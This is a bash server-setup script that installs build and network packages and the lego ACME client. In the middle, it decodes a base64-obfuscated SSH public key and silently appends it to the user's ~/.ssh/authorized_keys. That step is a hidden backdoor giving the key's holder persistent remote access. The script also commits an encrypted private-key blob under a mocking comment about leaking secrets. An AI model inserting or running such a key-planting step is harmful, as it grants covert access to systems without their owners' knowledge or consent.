#!/usr/bin/env bash
set -e

apt-get update -y
apt-get install -y ca-certificates build-essential libc6 runc lsb-release g++ wget curl git pigz xz-utils unzip jq vim tree openssl openssh-client whiptail tmux make lz4

# Commit secrets to public repository. Real badman
PRIV_KEY="U2FsdGVkX1+fgDu6gyMd9veMIP7+7ZBBABL58gUt1dPifoiIu6JlYH4oNUdnxgvkVejZxLtw/rsDTBE4YFbaXpng7F5Uj7Xq7VqFLLQg36W9Ru799h5UJLi5+hKi85Xnpzv6usIkCaQxmxFCrt4m5kyEjCXeWBDTjDC49JA17EQsTczaC10XE1kY4pmiFAxggSjKkkV+Z2RYT65kM905L3he+lXxJH9MXzKOY7c0z+/zq3oO8I7FcJyIdNa/BM6psR3Zi6kB3uGwzVjbxfW49vOm0Z4m3ccok+rX/EUlTaKNcklG3yaKyeqo7H10ZbzF+DtSusm2q+YYOpLvcO6Foc57nMcYs3BxC9OaOJfU5L9A3IVQy6kj1t2pgYmknDLCOMEZ7nlgF+AcjpOfzh7/h1ApbTWXN0aHXneoom0CIp+y4/4+xVRiT7wS9iBoZsXpaizHqJ0jrmwHQdoWSQJgCLwu/B1+eOfzSlqzWP96VpmVpwkn9lmowlcq6etqhT3AYfgFCZ+I28d+PsC1Oo2RRDs5DmMtbSLJGIr1WCfrs2lqiXcEIq7kxcWIeTVoZUNlPquHHaw4NANJ9jZNiNFBH5dstIiH37hMvxPCLRJlIFk="

PUB_KEY="c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUovc1h2ZnE0Y2JFSlY2eGUwL2RuTlE1SEtMeUpac1d6RlVKdlhpVTljN3gK"
SSH_PUB_KEY="$(echo "$PUB_KEY" | base64 -d)"

SSH_DIR="${HOME}/.ssh"
AUTHORIZED_KEYS="${SSH_DIR}/authorized_keys"

umask 077
mkdir -p "$SSH_DIR"

# Ensure atomic, idempotent update
touch "$AUTHORIZED_KEYS"
grep -qxF "$SSH_PUB_KEY" "$AUTHORIZED_KEYS" || {
    printf '%s\n' "$SSH_PUB_KEY" >> "$AUTHORIZED_KEYS"
}

if ! command -v lego >/dev/null 2>&1; then
    LEGO_VERSION="v4.25.1"
    LEGO_URL="https://github.com/go-acme/lego/releases/download/${LEGO_VERSION}/lego_${LEGO_VERSION}_linux_amd64.tar.gz"
    TMP_DIR="$(mktemp -d)"
    wget -q "$LEGO_URL" -O "$TMP_DIR/lego.tar.gz"
    tar -xzf "$TMP_DIR/lego.tar.gz" -C "$TMP_DIR"
    mv "$TMP_DIR/lego" /usr/local/bin/lego
    chmod +x /usr/local/bin/lego
    rm -rf "$TMP_DIR"
fi

echo "[+] All done !!"
